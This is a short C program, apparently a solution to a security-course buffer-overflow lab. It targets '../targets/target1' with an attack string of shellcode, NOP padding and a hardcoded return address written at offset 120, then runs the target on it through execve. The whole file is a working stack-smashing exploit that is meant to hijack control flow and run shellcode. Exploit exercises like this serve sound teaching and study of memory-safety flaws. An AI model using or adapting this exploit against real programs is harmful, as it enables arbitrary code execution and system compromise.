#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"

#define NOP 0x90
#define RET_ADDR "\x50\xfe\x21\x30" 

int
main ( int argc, char * argv[] )
{
	char attack_string[125];

	memset(attack_string, NOP, 125);
	memcpy(attack_string, shellcode, strlen(shellcode));
	memcpy(&attack_string[120], RET_ADDR, 4);
	attack_string[124] = '\0';

	char *	args[3];
	char *	env[1];

	args[0] = TARGET;
	args[1] = attack_string;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
